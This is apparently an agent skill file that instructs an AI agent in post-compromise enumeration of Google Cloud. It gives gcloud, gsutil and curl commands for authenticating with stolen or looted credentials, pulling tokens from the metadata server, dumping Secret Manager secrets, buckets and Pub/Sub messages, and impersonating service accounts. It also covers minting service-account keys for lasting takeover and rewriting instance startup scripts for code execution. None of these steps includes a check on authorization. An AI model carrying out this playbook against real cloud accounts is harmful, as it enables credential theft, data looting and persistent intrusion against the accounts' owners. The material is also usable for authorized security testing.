---
name: gcp-enumeration
description: Exhaustive GCP resource-plane enumeration with gcloud/gsutil and REST — authenticate with user creds, SA keys, or metadata tokens, discover effective permissions via IAM policies and testIamPermissions, sweep every project for Compute, GCS, Cloud Functions/Run, GKE, Cloud SQL, BigQuery, Secret Manager, Pub/Sub, Cloud Build, and service-account key/actAs privesc paths, then emit rupu work units. Use when you hold any GCP credential (user OAuth, sa.json key, access token, instance metadata) and need to map and loot the resource plane.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# GCP Resource-Plane Enumeration

Map everything a GCP identity can reach across projects, folders, and the
organization; extract secrets, command-exec and impersonation surface; hand
structured work units to sibling skills. Umbrella: `cloud-security`.

## 1. Authenticate and establish identity

```bash
# Service-account key file (the most common loot):
gcloud auth activate-service-account --key-file sa.json
# User OAuth (stolen creds / consented session):
gcloud auth login --no-launch-browser
# On a compromised GCE/GKE/Cloud Run box: metadata creds are ambient — gcloud
# just works; or pull the token raw:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

gcloud auth list                       # all cached identities; * = active
gcloud config list                     # active account + project
gcloud auth print-access-token         # OAuth bearer token for raw REST
gcloud auth print-identity-token       # OIDC token (invoke private Cloud Run/Functions)
```

Impersonation — if you have `iam.serviceAccounts.getAccessToken`
(`roles/iam.serviceAccountTokenCreator`) on another SA, every gcloud command can
run as it:

```bash
gcloud --impersonate-service-account=admin-sa@project-id-1.iam.gserviceaccount.com \
  projects list
gcloud config set auth/impersonate_service_account admin-sa@project-id-1.iam.gserviceaccount.com
```

## 2. Scope: projects, folders, organization

```bash
gcloud projects list --format=json          # every project the identity can see
gcloud organizations list --format=json
gcloud resource-manager folders list --organization=ORG_ID --format=json
gcloud config set project project-id-1
```

If `projects list` is empty but you have a token, the identity may still have
resource-level grants — probe known project ids directly
(`gcloud projects describe <p>`, service calls with `--project <p>`).

## 3. Permission discovery

```bash
gcloud projects get-iam-policy project-id-1 --format=json       # who holds what
gcloud organizations get-iam-policy ORG_ID --format=json
gcloud resource-manager folders get-iam-policy FOLDER_ID --format=json
gcloud iam service-accounts list --format=json
gcloud iam service-accounts get-iam-policy sa@project-id-1.iam.gserviceaccount.com --format=json
gcloud iam roles describe roles/editor --format=json            # expand a role to permissions
gcloud iam roles list --project project-id-1 --format=json      # custom roles
```

`get-iam-policy` on an SA reveals **actAs leads**: anyone with
`roles/iam.serviceAccountUser`/`TokenCreator`/`KeyAdmin` on that SA can become it.

When `get-iam-policy` is denied, learn your effective permissions bottom-up with
`testIamPermissions` — POST a list of candidate permissions; the API echoes back
the subset you hold (never an error for denied ones):

```bash
TOKEN=$(gcloud auth print-access-token)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/project-id-1:testIamPermissions" \
  -d '{"permissions":["resourcemanager.projects.get","iam.serviceAccounts.actAs","iam.serviceAccountKeys.create","compute.instances.setMetadata","storage.buckets.list","secretmanager.versions.access","cloudfunctions.functions.sourceCodeGet","deploymentmanager.deployments.create"]}'
```

Chunk the full ~10k permission list (<=100 per request, no wildcards) — recipe,
per-resource endpoints (compute, storage, SA), and the high-signal permission
set are in `references/gcloud-sweep.md` §2.

## 4. Full resource sweep — iterate EVERY project

For each project (full commands + what leaks in `references/gcloud-sweep.md`):

| Surface | Commands | Why it matters |
|---|---|---|
| Compute | `gcloud compute instances list`, `instances describe` (metadata: `startup-script`, `ssh-keys`; `serviceAccounts[].scopes`), `get-serial-port-output` | creds in startup scripts, SA+scopes on instance, serial logs leak tokens/paths |
| GCS | `gcloud storage ls`, `gcloud storage ls -r gs://bucket`, `gsutil ls -L`, `gsutil iam get gs://bucket` | tfstate, backups, allUsers/allAuthenticatedUsers exposure |
| Functions | `gcloud functions list`, `describe` (env vars, `serviceAccountEmail`), source via `--format='value(sourceUploadUrl)'` or REST generateDownloadUrl | env secrets, downloadable source |
| Cloud Run | `gcloud run services list`, `services describe` (env, SA, ingress), `gcloud run revisions list` | public URLs, env secrets |
| GKE | `gcloud container clusters list`, `get-credentials CLUSTER --zone Z` | kubeconfig -> cluster takeover; node SA scopes |
| Cloud SQL | `gcloud sql instances list` (public IP, authorizedNetworks), `gcloud sql users list -i INST` | exposed DBs; `gcloud sql users set-password` if permitted |
| BigQuery | `bq ls --format=json`, `bq ls dataset`, `bq show --format=json ds.table`, `bq head` | PII/creds in tables; dataset ACLs with allUsers |
| Secret Manager | `gcloud secrets list`, `gcloud secrets versions access latest --secret=NAME` | plaintext secrets, directly |
| Pub/Sub | `gcloud pubsub topics list`, `subscriptions list`, `subscriptions pull SUB --auto-ack` | live message loot |
| Cloud Build | `gcloud builds list`, `builds describe` + `cloudbuild.yaml` in source buckets | build SA is powerful; configs leak creds |
| SA keys | `gcloud iam service-accounts keys list --iam-account SA`, **`keys create key.json --iam-account SA` = durable privesc** | minting a key = permanent takeover of that SA |
| Artifact/GCR | `gcloud artifacts repositories list`, `gcloud artifacts docker images list REPO` | image pull -> secrets in layers |
| Networking | `gcloud compute addresses list`, `firewall-rules list` (grep `0.0.0.0/0`), `forwarding-rules list` | external attack surface |

**Note instance SA OAuth scopes**: an instance running the default compute SA
with `cloud-platform` scope = project-Editor-grade token sitting on the metadata
server. `devstorage.read_only`-only scope limits a stolen token regardless of IAM.

Raw REST for anything without a verb:

```bash
curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://compute.googleapis.com/compute/v1/projects/project-id-1/aggregated/instances"
```

Cloud Asset Inventory, when permitted, is one call for everything:
`gcloud asset search-all-resources --scope=projects/project-id-1 --format=json`
(also `search-all-iam-policies`).

## 5. Automated sweep -> inventory -> work units

```bash
python3 scripts/gcp_enum.py --all-projects -o out/gcp-inventory.json
python3 scripts/gcp_enum.py --project project-id-1 --services compute,storage,secrets,iam \
    --impersonate admin-sa@project-id-1.iam.gserviceaccount.com -o out/gcp-inventory.json
python3 scripts/gcp_to_work_units.py out/gcp-inventory.json -o out/work-units.json --assets out/assets.json
```

`gcp_enum.py` shells out to `gcloud ... --format=json` (and `bq`/`gcloud storage`)
across every project/service into one inventory JSON. `gcp_to_work_units.py`
converts it into a bare JSON array of `{"id","title","targets","hints"}` work
units — one per public resource, SA-with-actAs lead, secret, instance, bucket,
cluster — plus an assets list. **Every run of this skill ends with
`out/work-units.json`**; rupu wiring is in `references/rupu.md`.

## 6. Read the output / handoff

- **SA key minted / actAs on a privileged SA / `iam.roles.update` /
  `deploymentmanager.deployments.create` / `cloudbuild.builds.create`** ->
  `cloud-privilege-escalation` (these are the canonical GCP privesc primitives).
- **Buckets, especially `allUsers`/`allAuthenticatedUsers` bindings** ->
  `cloud-storage-exposure` with bucket names.
- **Startup scripts, env vars, serial output, build configs, function source,
  pulled Pub/Sub messages** -> `trufflehog` for credential extraction.
- **Shell on any instance** -> metadata server token theft
  (`metadata-ssrf-pivot`), then re-run this skill as the instance SA; also
  `gcloud compute instances add-metadata` ssh-keys / startup-script rewrite for
  exec if you only have API access.
- **GKE kubeconfig** -> Kubernetes attack flow; **Cloud SQL public IP** ->
  database attack surface.
- Record projects, SAs, instances, buckets, endpoints, secrets as assets and
  report verified exposures — shapes in `references/rupu.md`.

Depth: `references/gcloud-sweep.md` (per-service full command set,
testIamPermissions recipe, privesc permission cheat-sheet, token-only REST).
